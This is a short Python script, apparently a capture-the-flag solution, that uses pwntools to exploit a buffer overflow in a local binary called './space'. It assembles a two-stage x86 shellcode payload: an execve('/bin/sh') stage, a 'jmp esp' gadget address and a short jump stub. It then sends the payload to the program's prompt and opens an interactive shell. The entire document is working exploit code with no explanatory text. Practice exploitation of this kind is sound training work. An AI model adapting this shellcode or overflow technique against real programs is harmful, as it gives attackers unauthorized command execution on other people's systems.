#!/usr/bin/python3
from pwn import process, p32, asm

shell = process("./space")

shellback = asm("""
    push 0xb        # execve()
    pop eax         # $eax = execve()

    jmp $+0xe       # short jump
""")

shellcode = asm("""
    push 0x68       # "h"
    pushw 0x732f    # "/s"
    push 0x6e69622f # "/bin"
    mov ebx, esp    # $ebx = "/bin/sh"

    xor ecx, ecx    # $ecx = NULL
    cdq             # $edx = NULL

    int 0x80        # syscall
""")

payload  = b""
payload += shellcode      # 1st stage
payload += p32(0x804919f) # jmp esp;
payload += shellback      # 2nd stage

shell.sendlineafter(b"> ", payload)
shell.interactive()
